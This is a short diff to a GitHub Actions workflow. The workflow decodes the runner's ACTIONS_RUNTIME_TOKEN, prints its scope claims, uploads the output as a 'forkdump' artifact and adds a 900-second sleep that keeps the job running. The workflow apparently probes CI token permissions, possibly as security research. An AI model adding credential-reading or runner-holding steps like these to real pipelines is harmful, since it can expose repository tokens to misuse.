@@ -22,13 +22,13 @@ jobs:
           t=e.get('ACTIONS_RUNTIME_TOKEN','')
           p=t.split('.')[1]; p+='='*(-len(p)%4)
           c=json.loads(base64.urlsafe_b64decode(p))
-          print("AC   :", c.get('ac'))
-          print("SCP  :", c.get('scp'))
-          for k in ['repository_id','repository_owner_id','repository_visibility','run_id','job_workflow_ref','sha','ref','base_ref','head_ref','event_name','trust_tier','runner_type']:
-              print(f"{k:22}:", c.get(k))
+          print("AC  :", c.get('ac'))
+          print("SCP :", c.get('scp'))
           PYEOF
           cat out/claims.txt
       - uses: actions/upload-artifact@v4
         with:
-          name: forkdump
+          name: forkdump2
           path: out/
+      - name: hold
+        run: sleep 900
